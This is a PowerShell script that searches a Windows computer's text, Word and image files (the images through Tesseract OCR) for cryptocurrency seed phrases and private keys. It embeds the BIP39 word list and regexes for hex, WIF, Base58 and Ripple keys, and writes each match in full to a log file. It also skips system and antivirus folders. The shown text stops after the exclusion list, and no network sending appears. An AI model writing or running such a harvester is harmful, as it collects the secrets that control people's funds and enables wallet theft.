$currentUser = $env:USERNAME
$scriptDir = $PSScriptRoot
$logFile = Join-Path -Path $scriptDir -ChildPath "gogo_found_items_log_en.txt"
$localTesseractDir = Join-Path -Path $scriptDir -ChildPath "Tesseract-OCR"
$localTesseractExePath = Join-Path -Path $localTesseractDir -ChildPath "tesseract.exe"
$localTessdataDirPath = Join-Path -Path $localTesseractDir -ChildPath "tessdata"

$Global:tesseractExecutablePath = $null
$Global:tesseractDataDirectory = $null
$Global:excludePatterns = [System.Collections.Generic.List[string]]::new()
$Global:processedFiles = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

function Write-Log {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] FOUND: $message"
    try {
        Add-Content -Path $logFile -Value $logEntry -Encoding UTF8
    } catch {
        Write-Host "[$timestamp] [CRITICAL_ERROR] Failed to write to primary log file $logFile. Error: $($_.Exception.Message)"
    }
    Write-Host $logEntry
}

function Write-Console {
    param([string]$message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $consoleEntry = "[$timestamp] [$Type] $message"
    Write-Host $consoleEntry
}

function Test-Admin {
    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Add-ExclusionPattern {
    param (
        [string]$Pattern
    )
    if (-not [string]::IsNullOrWhiteSpace($Pattern)) {
        $cleanedPattern = $Pattern.Trim()
        if (-not ($Global:excludePatterns.Contains($cleanedPattern))) {
            $Global:excludePatterns.Add($cleanedPattern)
            Write-Console "Added exclusion pattern: $cleanedPattern" "DEBUG"
        }
    }
}

function Add-EnvBasedExclusion {
    param (
        [string]$EnvVarName,
        [string]$SubPathPatternWithWildcard
    )
    $envPathValue = $null
    try {
        $envPathValue = Get-Content "env:$EnvVarName" -ErrorAction Stop
    } catch {
        Write-Console "Environment variable '$EnvVarName' not found. Skipping exclusion for '$SubPathPatternWithWildcard'." "DEBUG"
        return
    }

    if (-not [string]::IsNullOrEmpty($envPathValue)) {
        if (-not (Test-Path $envPathValue -PathType Container -ErrorAction SilentlyContinue)) {
            Write-Console "Base path from environment variable '$EnvVarName' ('$envPathValue') does not exist or is not a directory. Pattern will be added: '$SubPathPatternWithWildcard'" "DEBUG"
        }
        Add-ExclusionPattern (Join-Path $envPathValue $SubPathPatternWithWildcard)
    } else {
        Write-Console "Environment variable '$EnvVarName' is empty. Skipping exclusion for '$SubPathPatternWithWildcard'." "DEBUG"
    }
}

New-Item -Path $logFile -ItemType File -Force -ErrorAction SilentlyContinue | Out-Null
Write-Console "Starting search for mnemonic phrases and private keys..."
Write-Console "Current User: $currentUser"; Write-Console "Script Directory: $scriptDir"
Write-Console "Operating System: $((Get-CimInstance Win32_OperatingSystem).Caption)"; Write-Console "PowerShell Version: $($PSVersionTable.PSVersion)"

if (-not (Test-Admin)) { Write-Console "Script is not running with Administrator privileges. File access to all locations might be restricted." "WARNING" }

Write-Console "--- Dependency Checks ---"

$tesseractAvailable = $false
Write-Console "Checking for user-provided local Tesseract OCR..."
Write-Console "Expected tesseract.exe path: '$localTesseractExePath' (inside '$localTesseractDir')" "DEBUG"
Write-Console "Expected tessdata directory path: '$localTessdataDirPath' (inside '$localTesseractDir')" "DEBUG"

if (Test-Path $localTesseractExePath -PathType Leaf) {
    Write-Console "Local tesseract.exe found at: $localTesseractExePath"
    if (Test-Path $localTessdataDirPath -PathType Container) {
        $engTrainedDataPath = Join-Path -Path $localTessdataDirPath -ChildPath "eng.traineddata"
        if (Test-Path $engTrainedDataPath -PathType Leaf) {
            Write-Console "'eng.traineddata' found in '$localTessdataDirPath'."
            $Global:tesseractExecutablePath = $localTesseractExePath
            $Global:tesseractDataDirectory = $localTessdataDirPath
            $tesseractAvailable = $true
            Write-Console "Local Tesseract OCR configured for use. Path: $($Global:tesseractExecutablePath), Tessdata Dir: $($Global:tesseractDataDirectory)"
            try {
                Write-Console "Attempting to get local Tesseract version info (for logging purposes only)..."
                $cmdOutput = & $Global:tesseractExecutablePath --tessdata-dir $Global:tesseractDataDirectory --version 2>&1 | Out-String
                Write-Console "Local Tesseract OCR version info: $($cmdOutput.Trim())"
            } catch {
                Write-Console "Could not get local Tesseract OCR version info. Error: $($_.Exception.Message)" "WARNING"
                Write-Console "Will proceed to use the provided Tesseract; ensure it is functional." "INFO"
            }
        } else {
            Write-Console "'eng.traineddata' not found in '$localTessdataDirPath'. Local Tesseract OCR will not work for English." "ERROR"
        }
    } else {
        Write-Console "'tessdata' folder not found at '$localTessdataDirPath' (expected inside '$localTesseractDir'). Local Tesseract OCR cannot load language data." "ERROR"
    }
} else {
    Write-Console "Local tesseract.exe not found at '$localTesseractExePath' (expected inside '$localTesseractDir')." "ERROR"
    Write-Console "Tesseract OCR functionality will be unavailable. Please ensure tesseract.exe and the 'tessdata' folder (containing eng.traineddata) are in the 'Tesseract-OCR' subfolder relative to this script." "ERROR"
}

if (-not $tesseractAvailable) {
    Write-Console "Tesseract OCR could not be configured. Image scanning will be unavailable." "WARNING"
}
Write-Console "--- Dependency Checks Completed (Tesseract OCR is the only external tool checked locally; PDF/Excel processing removed) ---"

$bip39WordList = @"
abandon
ability
able
about
above
absent
absorb
abstract
absurd
abuse
access
accident
account
accuse
achieve
acid
acoustic
acquire
across
act
action
actor
actress
actual
adapt
add
addict
address
adjust
admit
adult
advance
advice
aerobic
affair
afford
afraid
again
age
agent
agree
ahead
aim
air
airport
aisle
alarm
album
alcohol
alert
alien
all
alley
allow
almost
alone
alpha
already
also
alter
always
amateur
amazing
among
amount
amused
analyst
anchor
ancient
anger
angle
angry
animal
ankle
announce
annual
another
answer
antenna
antique
anxiety
any
apart
apology
appear
apple
approve
april
arch
arctic
area
arena
argue
arm
armed
armor
army
around
arrange
arrest
arrive
arrow
art
artefact
artist
artwork
ask
aspect
assault
asset
assist
assume
asthma
athlete
atom
attack
attend
attitude
attract
auction
audit
august
aunt
author
auto
autumn
average
avocado
avoid
awake
aware
away
awesome
awful
awkward
axis
baby
bachelor
bacon
badge
bag
balance
balcony
ball
bamboo
banana
banner
bar
barely
bargain
barrel
base
basic
basket
battle
beach
bean
beauty
because
become
beef
before
begin
behave
behind
believe
below
belt
bench
benefit
best
betray
better
between
beyond
bicycle
bid
bike
bind
biology
bird
birth
bitter
black
blade
blame
blanket
blast
bleak
bless
blind
blood
blossom
blouse
blue
blur
blush
board
boat
body
boil
bomb
bone
bonus
book
boost
border
boring
borrow
boss
bottom
bounce
box
boy
bracket
brain
brand
brass
brave
bread
breeze
brick
bridge
brief
bright
bring
brisk
broccoli
broken
bronze
broom
brother
brown
brush
bubble
buddy
budget
buffalo
build
bulb
bulk
bullet
bundle
bunker
burden
burger
burst
bus
business
busy
butter
buyer
buzz
cabbage
cabin
cable
cactus
cage
cake
call
calm
camera
camp
can
canal
cancel
candy
cannon
canoe
canvas
canyon
capable
capital
captain
car
carbon
card
cargo
carpet
carry
cart
case
cash
casino
castle
casual
cat
catalog
catch
category
cattle
caught
cause
caution
cave
ceiling
celery
cement
census
century
cereal
certain
chair
chalk
champion
change
chaos
chapter
charge
chase
chat
cheap
check
cheese
chef
cherry
chest
chicken
chief
child
chimney
choice
choose
chronic
chuckle
chunk
churn
cigar
cinnamon
circle
citizen
city
civil
claim
clap
clarify
claw
clay
clean
clerk
clever
click
client
cliff
climb
clinic
clip
clock
clog
close
cloth
cloud
clown
club
clump
cluster
clutch
coach
coast
coconut
code
coffee
coil
coin
collect
color
column
combine
come
comfort
comic
common
company
concert
conduct
confirm
congress
connect
consider
control
convince
cook
cool
copper
copy
coral
core
corn
correct
cost
cotton
couch
country
couple
course
cousin
cover
coyote
crack
cradle
craft
cram
crane
crash
crater
crawl
crazy
cream
credit
creek
crew
cricket
crime
crisp
critic
crop
cross
crouch
crowd
crucial
cruel
cruise
crumble
crunch
crush
cry
crystal
cube
culture
cup
cupboard
curious
current
curtain
curve
cushion
custom
cute
cycle
dad
damage
damp
dance
danger
daring
dash
daughter
dawn
day
deal
debate
debris
decade
december
decide
decline
decorate
decrease
deer
defense
define
defy
degree
delay
deliver
demand
demise
denial
dentist
deny
depart
depend
deposit
depth
deputy
derive
describe
desert
design
desk
despair
destroy
detail
detect
develop
device
devote
diagram
dial
diamond
diary
dice
diesel
diet
differ
digital
dignity
dilemma
dinner
dinosaur
direct
dirt
disagree
discover
disease
dish
dismiss
disorder
display
distance
divert
divide
divorce
dizzy
doctor
document
dog
doll
dolphin
domain
donate
donkey
donor
door
dose
double
dove
draft
dragon
drama
drastic
draw
dream
dress
drift
drill
drink
drip
drive
drop
drum
dry
duck
dumb
dune
during
dust
dutch
duty
dwarf
dynamic
eager
eagle
early
earn
earth
easily
east
easy
echo
ecology
economy
edge
edit
educate
effort
egg
eight
either
elbow
elder
electric
elegant
element
elephant
elevator
elite
else
embark
embody
embrace
emerge
emotion
employ
empower
empty
enable
enact
end
endless
endorse
enemy
energy
enforce
engage
engine
enhance
enjoy
enlist
enough
enrich
enroll
ensure
enter
entire
entry
envelope
episode
equal
equip
era
erase
erode
erosion
error
erupt
escape
essay
essence
estate
eternal
ethics
evidence
evil
evoke
evolve
exact
example
excess
exchange
excite
exclude
excuse
execute
exercise
exhaust
exhibit
exile
exist
exit
exotic
expand
expect
expire
explain
expose
express
extend
extra
eye
eyebrow
fabric
face
faculty
fade
faint
faith
fall
false
fame
family
famous
fan
fancy
fantasy
farm
fashion
fat
fatal
father
fatigue
fault
favorite
feature
february
federal
fee
feed
feel
female
fence
festival
fetch
fever
few
fiber
fiction
field
figure
file
film
filter
final
find
fine
finger
finish
fire
firm
first
fiscal
fish
fit
fitness
fix
flag
flame
flash
flat
flavor
flee
flight
flip
float
flock
floor
flower
fluid
flush
fly
foam
focus
fog
foil
fold
follow
food
foot
force
forest
forget
fork
fortune
forum
forward
fossil
foster
found
fox
fragile
frame
frequent
fresh
friend
fringe
frog
front
frost
frown
frozen
fruit
fuel
fun
funny
furnace
fury
future
gadget
gain
galaxy
gallery
game
gap
garage
garbage
garden
garlic
garment
gas
gasp
gate
gather
gauge
gaze
general
genius
genre
gentle
genuine
gesture
ghost
giant
gift
giggle
ginger
giraffe
girl
give
glad
glance
glare
glass
glide
glimpse
globe
gloom
glory
glove
glow
glue
goat
goddess
gold
good
goose
gorilla
gospel
gossip
govern
gown
grab
grace
grain
grant
grape
grass
gravity
great
green
grid
grief
grit
grocery
group
grow
grunt
guard
guess
guide
guilt
guitar
gun
gym
habit
hair
half
hammer
hamster
hand
happy
harbor
hard
harsh
harvest
hat
have
hawk
hazard
head
health
heart
heavy
hedgehog
height
hello
helmet
help
hen
hero
hidden
high
hill
hint
hip
hire
history
hobby
hockey
hold
hole
holiday
hollow
home
honey
hood
hope
horn
horror
horse
hospital
host
hotel
hour
hover
hub
huge
human
humble
humor
hundred
hungry
hunt
hurdle
hurry
hurt
husband
hybrid
ice
icon
idea
identify
idle
ignore
ill
illegal
illness
image
imitate
immense
immune
impact
impose
improve
impulse
inch
include
income
increase
index
indicate
indoor
industry
infant
inflict
inform
inhale
inherit
initial
inject
injury
inmate
inner
innocent
input
inquiry
insane
insect
inside
inspire
install
intact
interest
into
invest
invite
involve
iron
island
isolate
issue
item
ivory
jacket
jaguar
jar
jazz
jealous
jeans
jelly
jewel
job
join
joke
journey
joy
judge
juice
jump
jungle
junior
junk
just
kangaroo
keen
keep
ketchup
key
kick
kid
kidney
kind
kingdom
kiss
kit
kitchen
kite
kitten
kiwi
knee
knife
knock
know
lab
label
labor
ladder
lady
lake
lamp
language
laptop
large
later
latin
laugh
laundry
lava
law
lawn
lawsuit
layer
lazy
leader
leaf
learn
leave
lecture
left
leg
legal
legend
leisure
lemon
lend
length
lens
leopard
lesson
letter
level
liar
liberty
library
license
life
lift
light
like
limb
limit
link
lion
liquid
list
little
live
lizard
load
loan
lobster
local
lock
logic
lonely
long
loop
lottery
loud
lounge
love
loyal
lucky
luggage
lumber
lunar
lunch
luxury
lyrics
machine
mad
magic
magnet
maid
mail
main
major
make
mammal
man
manage
mandate
mango
mansion
manual
maple
marble
march
margin
marine
market
marriage
mask
mass
master
match
material
math
matrix
matter
maximum
maze
meadow
mean
measure
meat
mechanic
medal
media
melody
melt
member
memory
mention
menu
mercy
merge
merit
merry
mesh
message
metal
method
middle
midnight
milk
million
mimic
mind
minimum
minor
minute
miracle
mirror
misery
miss
mistake
mix
mixed
mixture
mobile
model
modify
mom
moment
monitor
monkey
monster
month
moon
moral
more
morning
mosquito
mother
motion
motor
mountain
mouse
move
movie
much
muffin
mule
multiply
muscle
museum
mushroom
music
must
mutual
myself
mystery
myth
naive
name
napkin
narrow
nasty
nation
nature
near
neck
need
negative
neglect
neither
nephew
nerve
nest
net
network
neutral
never
news
next
nice
night
noble
noise
nominee
noodle
normal
north
nose
notable
note
nothing
notice
novel
now
nuclear
number
nurse
nut
oak
obey
object
oblige
obscure
observe
obtain
obvious
occur
ocean
october
odor
off
offer
office
often
oil
okay
old
olive
olympic
omit
once
one
onion
online
only
open
opera
opinion
oppose
option
orange
orbit
orchard
order
ordinary
organ
orient
original
orphan
ostrich
other
outdoor
outer
output
outside
oval
oven
over
own
owner
oxygen
oyster
ozone
pact
paddle
page
pair
palace
palm
panda
panel
panic
panther
paper
parade
parent
park
parrot
party
pass
patch
path
patient
patrol
pattern
pause
pave
payment
peace
peanut
pear
peasant
pelican
pen
penalty
pencil
people
pepper
perfect
permit
person
pet
phone
photo
phrase
physical
piano
picnic
picture
piece
pig
pigeon
pill
pilot
pink
pioneer
pipe
pistol
pitch
pizza
place
planet
plastic
plate
play
please
pledge
pluck
plug
plunge
poem
poet
point
polar
pole
police
pond
pony
pool
popular
portion
position
possible
post
potato
pottery
poverty
powder
power
practice
praise
predict
prefer
prepare
present
pretty
prevent
price
pride
primary
print
priority
prison
private
prize
problem
process
produce
profit
program
project
promote
proof
property
prosper
protect
proud
provide
public
pudding
pull
pulp
pulse
pumpkin
punch
pupil
puppy
purchase
purity
purpose
purse
push
put
puzzle
pyramid
quality
quantum
quarter
question
quick
quit
quiz
quote
rabbit
raccoon
race
rack
radar
radio
rail
rain
raise
rally
ramp
ranch
random
range
rapid
rare
rate
rather
raven
raw
razor
ready
real
reason
rebel
rebuild
recall
receive
recipe
record
recycle
reduce
reflect
reform
refuse
region
regret
regular
reject
relax
release
relief
rely
remain
remember
remind
remove
render
renew
rent
reopen
repair
repeat
replace
report
require
rescue
resemble
resist
resource
response
result
retire
retreat
return
reunion
reveal
review
reward
rhythm
rib
ribbon
rice
rich
ride
ridge
rifle
right
rigid
ring
riot
ripple
risk
ritual
rival
river
road
roast
robot
robust
rocket
romance
roof
rookie
room
rose
rotate
rough
round
route
royal
rubber
rude
rug
rule
run
runway
rural
sad
saddle
sadness
safe
sail
salad
salmon
salon
salt
salute
same
sample
sand
satisfy
satoshi
sauce
sausage
save
say
scale
scan
scare
scatter
scene
scheme
school
science
scissors
scorpion
scout
scrap
screen
script
scrub
sea
search
season
seat
second
secret
section
security
seed
seek
segment
select
sell
seminar
senior
sense
sentence
series
service
session
settle
setup
seven
shadow
shaft
shallow
share
shed
shell
sheriff
shield
shift
shine
ship
shiver
shock
shoe
shoot
shop
short
shoulder
shove
shrimp
shrug
shuffle
shy
sibling
sick
side
siege
sight
sign
silent
silk
silly
silver
similar
simple
since
sing
siren
sister
situate
six
size
skate
sketch
ski
skill
skin
skirt
skull
slab
slam
sleep
slender
slice
slide
slight
slim
slogan
slot
slow
slush
small
smart
smile
smoke
smooth
snack
snake
snap
sniff
snow
soap
soccer
social
sock
soda
soft
solar
soldier
solid
solution
solve
someone
song
soon
sorry
sort
soul
sound
soup
source
south
space
spare
spatial
spawn
speak
special
speed
spell
spend
sphere
spice
spider
spike
spin
spirit
split
spoil
sponsor
spoon
sport
spot
spray
spread
spring
spy
square
squeeze
squirrel
stable
stadium
staff
stage
stairs
stamp
stand
start
state
stay
steak
steel
stem
step
stereo
stick
still
sting
stock
stomach
stone
stool
story
stove
strategy
street
strike
strong
struggle
student
stuff
stumble
style
subject
submit
subway
success
such
sudden
suffer
sugar
suggest
suit
summer
sun
sunny
sunset
super
supply
supreme
sure
surface
surge
surprise
surround
survey
suspect
sustain
swallow
swamp
swap
swarm
swear
sweet
swift
swim
swing
switch
sword
symbol
symptom
syrup
system
table
tackle
tag
tail
talent
talk
tank
tape
target
task
taste
tattoo
taxi
teach
team
tell
ten
tenant
tennis
tent
term
test
text
thank
that
theme
then
theory
there
they
thing
this
thought
three
thrive
throw
thumb
thunder
ticket
tide
tiger
tilt
timber
time
tiny
tip
tired
tissue
title
toast
tobacco
today
toddler
toe
together
toilet
token
tomato
tomorrow
tone
tongue
tonight
tool
tooth
top
topic
topple
torch
tornado
tortoise
toss
total
tourist
toward
tower
town
toy
track
trade
traffic
tragic
train
transfer
trap
trash
travel
tray
treat
tree
trend
trial
tribe
trick
trigger
trim
trip
trophy
trouble
truck
true
truly
trumpet
trust
truth
try
tube
tuition
tumble
tuna
tunnel
turkey
turn
turtle
twelve
twenty
twice
twin
twist
two
type
typical
ugly
umbrella
unable
unaware
uncle
uncover
under
undo
unfair
unfold
unhappy
uniform
unique
unit
universe
unknown
unlock
until
unusual
unveil
update
upgrade
uphold
upon
upper
upset
urban
urge
usage
use
used
useful
useless
usual
utility
vacant
vacuum
vague
valid
valley
valve
van
vanish
vapor
various
vast
vault
vehicle
velvet
vendor
venture
venue
verb
verify
version
very
vessel
veteran
viable
vibrant
vicious
victory
video
view
village
vintage
violin
virtual
virus
visa
visit
visual
vital
vivid
vocal
voice
void
volcano
volume
vote
voyage
wage
wagon
wait
walk
wall
walnut
want
warfare
warm
warrior
wash
wasp
waste
water
wave
way
wealth
weapon
wear
weasel
weather
web
wedding
weekend
weird
welcome
west
wet
whale
what
wheat
wheel
when
where
whip
whisper
wide
width
wife
wild
will
win
window
wine
wing
wink
winner
winter
wire
wisdom
wise
wish
witness
wolf
woman
wonder
wood
wool
word
work
world
worry
worth
wrap
wreck
wrestle
wrist
write
wrong
yard
year
yellow
you
young
youth
zebra
zero
zone
zoo
"@
$bip39Words = $bip39WordList -split '\r?\n' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
Write-Console "BIP39 word list loaded with $($bip39Words.Count) words. IMPORTANT: Ensure this is the full list of 2048 words for accurate mnemonic detection." "INFO"

function Is-MnemonicPhrase {
    param($wordsToCheck, $validBip39WordsList)
    if (($wordsToCheck.Count -ne 12) -and ($wordsToCheck.Count -ne 24)) { return $false }
    foreach ($word in $wordsToCheck) {
        if ($word -notin $validBip39WordsList) { return $false }
    }
    return $true
}

function Is-PrivateKey {
    param($textToTest)
    if ($textToTest -match '^(0x)?[0-9a-fA-F]{64}$') { return "64-character hexadecimal private key (e.g., ETH, TRC20/ERC20 USDT, BNB)" }
    if ($textToTest -match '^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$') { return "Bitcoin WIF private key (e.g., BTC, USDT Omni)" }
    if ($textToTest -match '^[1-9A-HJ-NP-Za-km-z]{43,88}$') {
        if ($textToTest.Length -eq 44) { return "Solana-like private key (Base58, 44 chars)" }
        if ($textToTest.Length -ge 86 -and $textToTest.Length -le 88) { return "Solana-like private key (Base58, likely 64-byte seed)" }
        return "Base58-encoded private key (various cryptos)"
    }
    if ($textToTest -match '^s[1-9A-HJ-NP-Za-km-z]{28,34}$') { return "Ripple private key (Base58, starts with 's')" }
    return $null
}

function Search-TextContent {
    param($rawContent, $filePathScanned, $officialBip39Words)
    $foundSomethingInFile = $false 
    $cleanedForMnemonics = $rawContent -replace '[\r\n\t]+', ' '
    $normalizedForMnemonics = $cleanedForMnemonics -replace '[^a-zA-Z\s]', ' '
    $wordsFound = $normalizedForMnemonics.ToLower() -split '\s+' | Where-Object { $_ -ne "" }

    if ($wordsFound.Count -ge 12) {
        for ($i = 0; $i -le ($wordsFound.Count - 12); $i++) {
            $sequence12 = $wordsFound[$i..($i+11)]
            if (Is-MnemonicPhrase $sequence12 $officialBip39Words) {
                Write-Log "In file `"$($filePathScanned)`", potential 12-word mnemonic: `"$($sequence12 -join ' ')`""
                $foundSomethingInFile = $true
            }

            if (($i + 23) -lt $wordsFound.Count) {
                $sequence24 = $wordsFound[$i..($i+23)]
                if (Is-MnemonicPhrase $sequence24 $officialBip39Words) {
                    Write-Log "In file `"$($filePathScanned)`", potential 24-word mnemonic: `"$($sequence24 -join ' ')`""
                    $foundSomethingInFile = $true
                }
            }
        }
    }

    $splitRegexForKeys = '[\s,;(){}\[\]"''`]+'
    $potentialKeyStrings = $rawContent -split $splitRegexForKeys | Where-Object { $_ -ne "" }
    foreach ($potentialKey in $potentialKeyStrings) {
        $trimmedPotentialKey = $potentialKey.Trim()
        if (-not [string]::IsNullOrEmpty($trimmedPotentialKey)) {
            $keyTypeDetected = Is-PrivateKey $trimmedPotentialKey
            if ($keyTypeDetected) {
                Write-Log "In file `"$($filePathScanned)`", potential $($keyTypeDetected): `"$($trimmedPotentialKey)`""
                $foundSomethingInFile = $true
            }
        }
    }
    return $foundSomethingInFile # Returns true if anything was logged from this content, false otherwise
}

$textExtensions     = @("*.txt", "*.sql", "*.log", "*.json", "*.conf")
$wordExtensions     = @("*.doc", "*.docx", "*.rtf")
$imageExtensions    = @("*.png", "*.jpg", "*.jpeg", "*.webp")
$explicitlyExcludedExtensions = @("*.pdf", "*.xls", "*.xlsx", "*.xlsm")

Add-ExclusionPattern "$scriptDir\*"
Add-ExclusionPattern "C:\Program Files (x86)\Google\GoogleUpdater\*"
Add-ExclusionPattern "C:\Windows\Panther\*"

Add-EnvBasedExclusion "WINDIR" "SoftwareDistribution\*"
Add-EnvBasedExclusion "WINDIR" "System32\DirectX\*"
Add-EnvBasedExclusion "WINDIR" "Microsoft.NET\Framework\*"
Add-EnvBasedExclusion "WINDIR" "Microsoft.NET\Framework64\*"
Add-EnvBasedExclusion "WINDIR" "System32\WindowsPowerShell\v1.0\*"
Add-EnvBasedExclusion "WINDIR" "SystemApps\Microsoft.Windows.Cortana_*\*"
Add-EnvBasedExclusion "WINDIR" "SystemApps\Microsoft.WindowsCalculator_*\*"
Add-EnvBasedExclusion "WINDIR" "SystemApps\Microsoft.WindowsTerminal_*\*"
Add-EnvBasedExclusion "WINDIR" "Temp\*"
Add-EnvBasedExclusion "WINDIR" "Prefetch\*"
Add-EnvBasedExclusion "WINDIR" "System32\LogFiles\*"
Add-EnvBasedExclusion "WINDIR" "servicing\Packages\*"

Add-EnvBasedExclusion "ProgramData" "Microsoft\Windows Defender\*"
Add-EnvBasedExclusion "ProgramData" "Anaconda3\*"
Add-EnvBasedExclusion "ProgramData" "Package Cache\*"

Add-EnvBasedExclusion "ProgramFiles" "Internet Explorer\*"
Add-EnvBasedExclusion "ProgramFiles" "Windows Media Player\*"
Add-EnvBasedExclusion "ProgramFiles" "Windows Photo Viewer\*"
Add-EnvBasedExclusion "ProgramFiles" "Microsoft OneDrive\*"
Add-EnvBasedExclusion "ProgramFiles" "Google\Chrome\Application\*"
Add-EnvBasedExclusion "ProgramFiles" "Mozilla Firefox\*"
Add-EnvBasedExclusion "ProgramFiles" "Microsoft Office\root\Office16\*"
Add-EnvBasedExclusion "ProgramFiles" "7-Zip\*"
Add-EnvBasedExclusion "ProgramFiles" "WinRAR\*"
Add-EnvBasedExclusion "ProgramFiles" "Microsoft Visual Studio\2022\Community\*"
Add-EnvBasedExclusion "ProgramFiles" "nodejs\*"
Add-EnvBasedExclusion "ProgramFiles" "Java\jdk-*\*"
Add-EnvBasedExclusion "ProgramFiles" "Git\*"
Add-EnvBasedExclusion "ProgramFiles" "Notepad++\*"
Add-EnvBasedExclusion "ProgramFiles" "Sublime Text\*"
Add-EnvBasedExclusion "ProgramFiles" "VideoLAN\VLC\*"
Add-EnvBasedExclusion "ProgramFiles" "Bandizip\*"
Add-EnvBasedExclusion "ProgramFiles" "Everything\*"
Add-EnvBasedExclusion "ProgramFiles" "DAUM\PotPlayer\*"
Add-EnvBasedExclusion "ProgramFiles" "SumatraPDF\*"
Add-EnvBasedExclusion "ProgramFiles" "TeamViewer\*"
Add-EnvBasedExclusion "ProgramFiles" "PremiumSoft\Navicat Premium\*"
Add-EnvBasedExclusion "ProgramFiles" "DBeaver\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\DataGrip *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\PyCharm *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\WebStorm *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\IntelliJ IDEA *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\CLion *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\GoLand *\*"
Add-EnvBasedExclusion "ProgramFiles" "JetBrains\Rider *\*"
Add-EnvBasedExclusion "ProgramFiles" "RedisDesktopManager\*"
Add-EnvBasedExclusion "ProgramFiles" "Docker\Docker\*"
Add-EnvBasedExclusion "ProgramFiles" "OpenVPN\*"
Add-EnvBasedExclusion "ProgramFiles" "LibreOffice\*"
Add-EnvBasedExclusion "ProgramFiles" "Tracker Software\PDF Editor\*"
Add-EnvBasedExclusion "ProgramFiles" "Nitro\Pro\*"
Add-EnvBasedExclusion "ProgramFiles" "Scrivener3\*"
Add-EnvBasedExclusion "ProgramFiles" "NetBeans *\*"
Add-EnvBasedExclusion "ProgramFiles" "Android\Android Studio\*"
Add-EnvBasedExclusion "ProgramFiles" "RStudio\*"
Add-EnvBasedExclusion "ProgramFiles" "MATLAB\R*\*"
Add-EnvBasedExclusion "ProgramFiles" "Microsoft Office\Updates\*"
Add-EnvBasedExclusion "ProgramFiles" "Unity Hub\*"
Add-EnvBasedExclusion "ProgramFiles" "Epic Games\UE_*\*"
Add-EnvBasedExclusion "ProgramFiles" "Corel\*"
Add-EnvBasedExclusion "ProgramFiles" "SketchUp\*"
Add-EnvBasedExclusion "ProgramFiles" "Blender Foundation\Blender *\*"
Add-EnvBasedExclusion "ProgramFiles" "GIMP 2\*"
Add-EnvBasedExclusion "ProgramFiles" "Adobe\*"
Add-EnvBasedExclusion "ProgramFiles" "Inkscape\*"
Add-EnvBasedExclusion "ProgramFiles" "paint.net\*"
Add-EnvBasedExclusion "ProgramFiles" "Krita (x64)\*"
Add-EnvBasedExclusion "ProgramFiles" "Blackmagic Design\DaVinci Resolve\*"
Add-EnvBasedExclusion "ProgramFiles" "Shotcut\*"
Add-EnvBasedExclusion "ProgramFiles" "AVAST Software\Avast\*"
Add-EnvBasedExclusion "ProgramFiles" "AVG\Antivirus\*"
Add-EnvBasedExclusion "ProgramFiles" "Bitdefender\Bitdefender Security\*"
Add-EnvBasedExclusion "ProgramFiles" "ESET\ESET NOD32 Antivirus\*"
Add-EnvBasedExclusion "ProgramFiles" "McAfee\*"
Add-EnvBasedExclusion "ProgramFiles" "Norton Security\*"
Add-EnvBasedExclusion "ProgramFiles" "Malwarebytes\Anti-Malware\*"
Add-EnvBasedExclusion "ProgramFiles" "Sophos\Sophos Anti-Virus\*"
Add-EnvBasedExclusion "ProgramFiles" "Trend Micro\*"
Add-EnvBasedExclusion "ProgramFiles" "BraveSoftware\Brave-Browser\Application\*"
Add-EnvBasedExclusion "ProgramFiles" "qBittorrent\*"
Add-EnvBasedExclusion "ProgramFiles" "FileZilla Server\*"
Add-EnvBasedExclusion "ProgramFiles" "PuTTY\*"
Add-EnvBasedExclusion "ProgramFiles" "CCleaner\*"
Add-EnvBasedExclusion "ProgramFiles" "VS Revo Group\Revo Uninstaller\*"
Add-EnvBasedExclusion "ProgramFiles" "Ditto\*"
Add-EnvBasedExclusion "ProgramFiles" "AutoHotkey\*"
Add-EnvBasedExclusion "ProgramFiles" "Huorong\Sysdiag\*"
Add-EnvBasedExclusion "ProgramFiles" "Ludashi\*"
Add-EnvBasedExclusion "ProgramFiles" "WindowsApps\Microsoft.WindowsCalculator_*\*"
Add-EnvBasedExclusion "ProgramFiles" "WindowsApps\Microsoft.WindowsTerminal_*\*"

Add-EnvBasedExclusion "ProgramFiles(x86)" "Microsoft\Edge\Application\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Microsoft Visual Studio\Shared\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Adobe\Acrobat Reader DC\Reader\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "SogouInput\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Tencent\QQPlayer\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "VMware\VMware Workstation\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "MarkdownPad 2\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Foxit Software\Foxit Reader\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "AnyDesk\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "VMware\VMware Horizon View Client\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "NetSarang\Xshell 7\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "NetSarang\Xftp 7\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Webex\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Microsoft\Skype for Desktop\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Thunder Network\Thunder\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "UU\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "360\360Safe\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Kingsoft\KSafe\*"
Add-EnvBasedExclusion "ProgramFiles(x86)" "Tencent\QQPCMgr\*"
